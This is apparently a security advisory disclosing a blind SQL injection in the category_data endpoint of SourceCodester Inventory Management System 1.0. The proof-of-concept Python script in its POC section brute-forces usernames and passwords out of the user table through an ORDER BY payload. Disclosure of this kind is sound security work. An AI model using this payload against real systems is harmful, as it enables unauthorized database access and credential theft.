# SourceCodester Inventory Management System 1.0 has a SQL Injection vulnerability in catagory_data.php
## Software

- Software: Inventory Management System 1.0
- Software Link: https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html
- Vulnerability Type: SQL Injection
- Attack Type: Remote
- Vendor of Product: Sourcecodester

## Description

A vulnerability has been found in SourceCodester Inventory Management System 1.0 and classified as critical. SourceCodester Inventory Management System 1.0 has a SQL Injection vulnerability in catagory_data.php. Affected is file catagory_data.php, the manipulation of the argument `columns[1][data]` leads to SQL injection. The injection vulnerability located after the `order by` clause. By comparing the different sorting order results between `order by id^1` and `order by id^0`, it is possible to achieve boolean-based blind injection. Remote attackers can exploit boolean-based blind injection to retrieve all data from the database.

## Vulnerability Code
- app/ajax/catagory_data.php

![](https://github.com/Yesec/Inventory-Management-System/assets/19534204/2cda67b0-0026-4949-b2c8-21945854c20e)

## POC
```python
import requests
import string

url = "http://localhost/app/ajax/catagory_data.php"
res = ""
dict = string.digits + string.ascii_lowercase + "!@#$%^()[]_."

for i in range(1,50):
    for j in dict:
        # payload = "id^(select(select database()) regexp '^%s');" % (res+j)
        payload = "id^(select(select group_concat(username,password) from user) regexp '^%s');" % (res+j)
        data = {
            "order[0][column]":"1",
            "columns[1][data]": payload
        }
        response = requests.post(url, data=data)
        if '3' in response.text[802:810]:
            res += j
            print("[*] Found: ",res)
            break
```
![](https://github.com/Yesec/Inventory-Management-System/assets/19534204/19dde424-e1e4-4658-a547-5f74ee739870)
